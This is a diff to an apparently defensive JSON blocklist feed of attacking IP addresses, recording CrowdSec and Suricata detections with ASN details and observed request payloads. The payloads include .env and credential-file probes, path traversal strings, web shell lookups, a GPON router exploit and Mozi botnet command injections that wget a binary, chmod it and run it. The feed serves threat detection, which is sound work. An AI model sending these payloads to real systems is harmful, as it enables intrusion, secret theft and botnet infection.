@@ -1,10 +1,10 @@
 {
-  "generated_at": "2026-10-09T01:00:00Z",
+  "generated_at": "2026-10-09T13:00:00Z",
   "ttl_days": 7,
   "scope": "all",
   "counts": {
-    "total": 1342,
-    "v4": 1342,
+    "total": 1347,
+    "v4": 1347,
     "v6": 0
   },
   "items": [
@@ -967,59 +967,6 @@
       "asn_prefix": "20.64.0.0/10",
       "tags": [
         "mwl:cloud=\"azure\""
-      ]
-    },
-    {
-      "ip": "20.58.177.98",
-      "family": "v4",
-      "first_seen": "2026-10-02T11:00:00Z",
-      "last_seen": "2026-10-02T11:00:00Z",
-      "scenarios": [
-        "crowdsec/http-probing"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "8075",
-      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
-      "asn_prefix": "20.48.0.0/12",
-      "tags": [
-        "mwl:cloud=\"azure\""
-      ],
-      "payloads": [
-        "GET /wp-content/plugins/hellopress/wp_filemanager.php",
-        "GET /this_is_a_new_hello_world.php",
-        "GET /3PJcpMFsD8B.php",
-        "GET /aa.php",
-        "GET /z70.php",
-        "GET /adminfuns.php",
-        "GET /av.php",
-        "GET /dex.php",
-        "GET /chosen.php",
-        "GET /1.php?p=",
-        "GET /radio.php"
-      ]
-    },
-    {
-      "ip": "54.194.21.157",
-      "family": "v4",
-      "first_seen": "2026-10-02T10:00:00Z",
-      "last_seen": "2026-10-02T10:00:00Z",
-      "scenarios": [
-        "crowdsec/http-bad-user-agent"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "16509",
-      "asn_name": "AMAZON-02 - Amazon.com",
-      "asn_prefix": "54.194.0.0/16",
-      "tags": [
-        "mwl:cloud=\"aws\""
-      ],
-      "payloads": [
-        "GET /robots.txt",
-        "GET /"
       ]
     },
     {
@@ -22987,6 +22934,7 @@
         "mwl:cloud=\"gcp\""
       ],
       "payloads": [
+        "GET /firebase.json",
         "GET /.env.save",
         "GET /service-worker.js",
         "GET /.env?raw??",
@@ -23004,7 +22952,6 @@
         "GET /api/uploads/..%2F..%2F..%2F..%2F.env",
         "GET /static/app/.env",
         "GET /static/home/user/.env",
-        "GET /..%2F..%2F.env",
         "GET /settings%2F.env",
         "POST /graphql"
       ]
@@ -23060,7 +23007,7 @@
       "ip": "34.87.174.130",
       "family": "v4",
       "first_seen": "2026-10-08T21:00:00Z",
-      "last_seen": "2026-10-08T21:00:00Z",
+      "last_seen": "2026-10-09T04:00:00Z",
       "scenarios": [
         "crowdsec/http-admin-interface-probing",
         "crowdsec/http-bad-user-agent",
@@ -23073,22 +23020,13 @@
       "sources": [
         "crowdsec"
       ],
+      "asn": "396982",
+      "asn_name": "GOOGLE-CLOUD-PLATFORM - Google LLC",
+      "asn_prefix": "34.87.160.0/20",
       "tags": [
         "mwl:cloud=\"gcp\""
       ],
       "payloads": [
-        "GET /.zshrc",
-        "GET /gcp-service.json",
-        "GET /secrets.env",
-        "GET /cache/.env",
-        "GET /resources/..%2F..%2F..%2F..%2F.env",
-        "GET /static/..%2F..%2F..%2F..%2F.env",
-        "GET /.env.local",
-        "GET /.env.bak",
-        "GET /",
-        "GET /mbvf6kjojrw7gft6cqft",
-        "GET /z9x8c7v6b5-debug-trigger-salledarcade.fr",
-        "GET /zjqisuw0ktvtesiaj48y",
         "POST /graphql",
         "GET /.env",
         "GET /proc/self/environ",
@@ -23096,7 +23034,19 @@
         "POST /api/graphql",
         "GET /proc/self/cgroup",
         "GET /proc/self/cmdline",
-        "POST /"
+        "POST /",
+        "GET /.env.backup",
+        "GET /.env.production",
+        "GET /e4gn03x2fydp8i5m0ac3",
+        "GET /nmh7pdlcy55qjdjv30ll",
+        "GET /[REDACTED_DOMAIN]",
+        "GET /api/system/fileView?file=/app/.env",
+        "GET /api/system/fileView?file=/proc/self/environ",
+        "GET /userfiles?path=../../../.env",
+        "GET /userfiles?path=../../.env",
+        "GET /userfiles?path=../../../../proc/self/environ",
+        "GET /userfiles/x?path=../../../../proc/self/environ",
+        "GET /"
       ]
     },
     {
@@ -23292,6 +23242,9 @@
       "sources": [
         "suricata"
       ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "20.64.0.0/10",
       "tags": [
         "mwl:cloud=\"azure\""
       ],
@@ -23334,6 +23287,169 @@
       "asn": "14061",
       "asn_name": "DIGITALOCEAN-ASN - DigitalOcean",
       "asn_prefix": "24.199.96.0/20",
+      "payloads": [
+        "GET /"
+      ]
+    },
+    {
+      "ip": "20.205.114.149",
+      "family": "v4",
+      "first_seen": "2026-10-09T10:00:00Z",
+      "last_seen": "2026-10-09T10:00:00Z",
+      "scenarios": [
+        "crowdsec/http-admin-interface-probing",
+        "crowdsec/http-probing"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "20.192.0.0/10",
+      "tags": [
+        "mwl:cloud=\"azure\""
+      ],
+      "payloads": [
+        "GET /wp-admin/css/colors/midnight/",
+        "GET /manager.php?p=",
+        "GET /adminfuns.php",
+        "GET /wp-content/plugins/hellopress/wp_filemanager.php",
+        "GET /this_is_a_new_hello_world.php",
+        "GET /ws.php",
+        "GET /xivoefjr.php",
+        "GET /bnmtp.php",
+        "GET /or.php",
+        "GET /date1.php",
+        "GET /opsh.php",
+        "GET /kgb.php",
+        "GET /wp-atom.php"
+      ]
+    },
+    {
+      "ip": "74.225.200.149",
+      "family": "v4",
+      "first_seen": "2026-10-09T02:00:00Z",
+      "last_seen": "2026-10-09T02:00:00Z",
+      "scenarios": [
+        "crowdsec/http-admin-interface-probing",
+        "crowdsec/http-backdoors-attempts",
+        "crowdsec/http-probing",
+        "crowdsec/http-technology-probing",
+        "crowdsec/http-wordpress-scan"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "74.224.0.0/14",
+      "tags": [
+        "mwl:cloud=\"azure\""
+      ],
+      "payloads": [
+        "GET /1.php",
+        "GET /css.php",
+        "GET /wp-content/index.php",
+        "GET /wp-admin/css/colors/index.php",
+        "GET /wp-admin/network/index.php",
+        "GET /wp-includes/IXR/index.php",
+        "GET /info.php",
+        "GET /wp-includes/images/",
+        "GET /wp-includes/images/smilies/",
+        "GET /222.php",
+        "GET /classwithtostring.php",
+        "GET /lock360.php",
+        "GET /up.php",
+        "GET /admin.php",
+        "GET /chosen.php"
+      ]
+    },
+    {
+      "ip": "72.255.33.193",
+      "family": "v4",
+      "first_seen": "2026-10-09T08:00:00Z",
+      "last_seen": "2026-10-09T08:00:00Z",
+      "scenarios": [
+        "suricata/ET EXPLOIT HackingTrio UA (Hello, World)"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "9541",
+      "asn_name": "CYBERNET-AP - Cyber Internet Services (Pvt) Ltd.",
+      "asn_prefix": "72.255.33.0/24",
+      "payloads": [
+        "POST /GponForm/diag_Form?images/"
+      ]
+    },
+    {
+      "ip": "202.63.202.23",
+      "family": "v4",
+      "first_seen": "2026-10-09T06:00:00Z",
+      "last_seen": "2026-10-09T06:00:00Z",
+      "scenarios": [
+        "suricata/ET HUNTING Suspicious Chmod Usage in URI (Inbound)"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "141342",
+      "asn_name": "FIBERISHPVTLTD-AS-AP - FIBERISH (PVT) LTD",
+      "asn_prefix": "202.63.202.0/24",
+      "payloads": [
+        "GET /shell?cd+/tmp;rm+-rf+*;wget+http://202.63.202.23:45912/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws"
+      ]
+    },
+    {
+      "ip": "103.72.87.9",
+      "family": "v4",
+      "first_seen": "2026-10-09T05:00:00Z",
+      "last_seen": "2026-10-09T05:00:00Z",
+      "scenarios": [
+        "suricata/ET HUNTING Suspicious Chmod Usage in URI (Inbound)"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "153844",
+      "asn_name": "RNBL-AS-AP - Riderz Network Broadband (Private) Limited",
+      "asn_prefix": "103.72.87.0/24",
+      "payloads": [
+        "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws"
+      ]
+    },
+    {
+      "ip": "152.32.128.214",
+      "family": "v4",
+      "first_seen": "2026-10-09T01:00:00Z",
+      "last_seen": "2026-10-09T01:00:00Z",
+      "scenarios": [
+        "suricata/SURICATA TLS invalid SNI length"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "135377",
+      "asn_name": "UCLOUD-HK-AS-AP - UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED",
+      "asn_prefix": "152.32.128.0/24"
+    },
+    {
+      "ip": "52.188.225.226",
+      "family": "v4",
+      "first_seen": "2026-10-09T11:00:00Z",
+      "last_seen": "2026-10-09T11:00:00Z",
+      "scenarios": [
+        "suricata/ET SCAN Zmap User-Agent (Inbound)"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "52.160.0.0/11",
+      "tags": [
+        "mwl:cloud=\"azure\""
+      ],
       "payloads": [
         "GET /"
       ]
